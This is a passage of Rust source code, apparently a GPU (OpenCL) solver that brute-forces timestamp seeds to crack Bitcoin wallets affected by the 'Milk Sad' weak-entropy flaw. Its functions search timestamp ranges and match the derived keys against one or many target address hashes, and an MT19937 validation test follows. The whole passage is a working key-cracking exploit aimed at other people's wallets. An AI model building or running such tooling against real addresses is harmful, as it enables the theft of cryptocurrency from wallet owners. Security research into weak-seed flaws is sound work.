        }
        Ok(keys)
    }

    pub fn compute_milk_sad_crack(
        &self,
        start_timestamp: u32,
        end_timestamp: u32,
        target_h160: &[u8; 20],
        purpose: u32,
        entropy_bits: u32,
    ) -> ocl::Result<Vec<u64>> {
        let kernel_name = match entropy_bits {
            192 => "milk_sad_crack_192",
            256 => "milk_sad_crack_256",
            _   => "milk_sad_crack",
        };
        let max_results = 1024;

        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_results)
            .build()?;
        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;
        buffer_count.write(&vec![0u32]).enq()?;

        let mut h1: u64 = 0; let mut h2: u64 = 0; let mut h3: u32 = 0;
        for (i, &b) in target_h160.iter().enumerate().take(8)       { h1 |= (b as u64) << (i * 8); }
        for (i, &b) in target_h160.iter().skip(8).enumerate().take(8)  { h2 |= (b as u64) << (i * 8); }
        for (i, &b) in target_h160.iter().skip(16).enumerate().take(4) { h3 |= (b as u32) << (i * 8); }

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results).arg(&buffer_count)
            .arg(h1).arg(h2).arg(h3)
            .arg(purpose)
            .arg(start_timestamp)
            .build()?;

        let range = (end_timestamp - start_timestamp) as usize;
        let local  = self.max_work_group_size.min(256);
        let global = range.div_ceil(local) * local;
        unsafe { kernel.cmd().global_work_size(global).local_work_size(local).enq()?; }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;
        if count > 0 {
            let read_count = count.min(max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }

    pub fn compute_milk_sad_crack_multi_target(
        &self,
        start_timestamp: u32,
        end_timestamp: u32,
        flat_h160: &[u8],
        purposes: &[u32],
        entropy_bits: u32,
        multipath: bool,
    ) -> ocl::Result<Vec<(u32, u32, u32)>> {
        let target_count = purposes.len() as u32;
        assert_eq!(flat_h160.len(), purposes.len() * 20);

        let kernel_name = match (entropy_bits, multipath) {
            (256, true)  => "milk_sad_mt_multi30_256",
            (256, false) => "milk_sad_mt_256",
            (192, true)  => "milk_sad_mt_multi30_192",
            (192, false) => "milk_sad_mt_192",
            (_,   true)  => "milk_sad_mt_multi30",
            (_,   false) => "milk_sad_mt",
        };
        let max_results = 8192usize;

        let buf_h160 = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(flat_h160.len())
            .copy_host_slice(flat_h160)
            .build()?;
        let buf_purposes = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(purposes.len())
            .copy_host_slice(purposes)
            .build()?;
        let buf_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_results * 2)
            .build()?;
        let buf_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;
        buf_count.write(&vec![0u32]).enq()?;

        let range = (end_timestamp - start_timestamp) as usize;
        let local  = self.max_work_group_size.min(256);
        let global = range.div_ceil(local) * local;

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buf_results).arg(&buf_count)
            .arg(&buf_h160).arg(&buf_purposes)
            .arg(target_count)
            .arg(start_timestamp)
            .arg(max_results as u32)
            .global_work_size(global).local_work_size(local)
            .build()?;
        unsafe { kernel.cmd().global_work_size(global).local_work_size(local).enq()?; }

        let mut count_vec = vec![0u32; 1];
        buf_count.read(&mut count_vec).enq()?;
        let count = (count_vec[0] as usize).min(max_results);
        if count == 0 { return Ok(Vec::new()); }

        let mut raw = vec![0u64; max_results * 2];
        buf_results.read(&mut raw).enq()?;

        Ok((0..count).map(|i| {
            let w0 = raw[i * 2];
            let w1 = raw[i * 2 + 1];
            ((w0 & 0xFFFF_FFFF) as u32, (w0 >> 32) as u32, w1 as u32)
        }).collect())
    }

    pub fn compute_milk_sad_crack_multipath(
        &self,
        start_timestamp: u32,
        end_timestamp: u32,
        target_h160: &[u8; 20],
        purpose: u32,
        entropy_bits: u32,
    ) -> ocl::Result<Vec<(u32, u32)>> {
        let kernel_name = match entropy_bits {
            192 => "milk_sad_crack_multi30_192",
            256 => "milk_sad_crack_multi30_256",
            _   => "milk_sad_crack_multi30",
        };
        let max_results = 1024;

        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_results)
            .build()?;
        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;
        buffer_count.write(&vec![0u32]).enq()?;

        let mut h1: u64 = 0; let mut h2: u64 = 0; let mut h3: u32 = 0;
        for (i, &b) in target_h160.iter().enumerate().take(8)       { h1 |= (b as u64) << (i * 8); }
        for (i, &b) in target_h160.iter().skip(8).enumerate().take(8)  { h2 |= (b as u64) << (i * 8); }
        for (i, &b) in target_h160.iter().skip(16).enumerate().take(4) { h3 |= (b as u32) << (i * 8); }

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results).arg(&buffer_count)
            .arg(h1).arg(h2).arg(h3)
            .arg(purpose)
            .arg(start_timestamp)
            .build()?;

        let range = (end_timestamp - start_timestamp) as usize;
        let local  = self.max_work_group_size.min(256);
        let global = range.div_ceil(local) * local;
        unsafe { kernel.cmd().global_work_size(global).local_work_size(local).enq()?; }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;
        if count > 0 {
            let read_count = count.min(max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;
            Ok(results.iter().take(read_count).map(|&v| ((v & 0xFFFFFFFF) as u32, (v >> 32) as u32)).collect())
        } else {
            Ok(Vec::new())
        }
    }

    pub fn test_mt19937(&self, seeds: &[u32]) -> ocl::Result<Vec<[u8; 16]>> {
        let count = seeds.len();
        let buffer_seeds = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(count)
            .copy_host_slice(seeds)
            .build()?;
        let buffer_results = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(count * 16)
            .build()?;
        let local_work_size = self.calculate_local_work_size(count);
        let kernel = self
            .pro_que
            .kernel_builder("test_mt19937")
            .arg(&buffer_seeds).arg(&buffer_results)
            .arg(count as u32)
            .global_work_size(count).local_work_size(local_work_size)
            .build()?;
        unsafe { kernel.enq()?; }

        let mut raw_results = vec![0u8; count * 16];
        buffer_results.read(&mut raw_results).enq()?;
        let mut results = Vec::with_capacity(count);
        for chunk in raw_results.chunks(16) {
            let mut entropy = [0u8; 16];
            entropy.copy_from_slice(chunk);
            results.push(entropy);
        }
        Ok(results)
    }

    pub fn device_info(&self) -> ocl::Result<String> {
        let device = self.pro_que.device();
        let name    = device.name()?;
        let vendor  = device.vendor()?;
        let version = device.version()?;
        let driver  = match device.info(ocl::enums::DeviceInfo::DriverVersion)? {
            ocl::enums::DeviceInfoResult::DriverVersion(v) => v,
            _ => "Unknown".to_string(),
        };
        let compute_units = match device.info(ocl::enums::DeviceInfo::MaxComputeUnits)? {
            ocl::enums::DeviceInfoResult::MaxComputeUnits(u) => u, _ => 0,
        };
        let clock_freq = match device.info(ocl::enums::DeviceInfo::MaxClockFrequency)? {
            ocl::enums::DeviceInfoResult::MaxClockFrequency(f) => f, _ => 0,
        };
        let global_mem = match device.info(ocl::enums::DeviceInfo::GlobalMemSize)? {
            ocl::enums::DeviceInfoResult::GlobalMemSize(s) => s / (1024 * 1024), _ => 0,
        };
        let local_mem = match device.info(ocl::enums::DeviceInfo::LocalMemSize)? {
            ocl::enums::DeviceInfoResult::LocalMemSize(s) => s / 1024, _ => 0,
        };
        let max_alloc = match device.info(ocl::enums::DeviceInfo::MaxMemAllocSize)? {
            ocl::enums::DeviceInfoResult::MaxMemAllocSize(s) => s / (1024 * 1024), _ => 0,
        };
        Ok(format!(
            "GPU Device Information:\nName: {}\nVendor: {}\nVersion: {}\nDriver: {}\n\
             Compute Units: {}\nClock Frequency: {} MHz\nGlobal Memory: {} MB\n\
             Local Memory: {} KB\nMax Allocation: {} MB\n\
             Max Work Group Size: {}\nPreferred Multiple: {}",
            name, vendor, version, driver,
            compute_units, clock_freq, global_mem, local_mem, max_alloc,
            self.max_work_group_size, self.preferred_work_group_multiple
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_mt19937_validation() {
        let test_cases = vec![
            (0u32,          &[0x8cu8,0x7f,0x0a,0xac,0x97,0xc4,0xaa,0x2f,0xb7,0x16,0xa6,0x75,0xd8,0x21,0xcc,0xc0] as &[u8]),
            (1u32,          &[0x6au8,0xc1,0xf4,0x25,0xff,0x47,0x80,0xeb,0xb8,0x67,0x2f,0x8c,0xee,0xbc,0x14,0x48] as &[u8]),
            (1234567890u32, &[0x9eu8,0x69,0x55,0x82,0x57,0x2b,0x97,0xff,0x97,0x74,0xa5,0x66,0x26,0x26,0xe4,0x2f] as &[u8]),
        ];
        let solver = match GpuSolver::new() {
            Ok(s)  => s,
            Err(e) => { eprintln!("GPU not available: {}", e); return; }
        };
        let seeds: Vec<u32> = test_cases.iter().map(|(s, _)| *s).collect();
        match solver.test_mt19937(&seeds) {
            Ok(results) => {
                for (i, (seed, expected)) in test_cases.iter().enumerate() {
                    eprintln!("Seed {}: expected {:02x?}, got {:02x?}", seed, expected, &results[i]);
                    assert_eq!(&results[i][..], *expected, "MT19937 mismatch for seed {}", seed);
                }
                eprintln!("All MT19937 tests passed!");
            }
            Err(e) => panic!("MT19937 GPU test failed: {}", e),
        }
    }
}
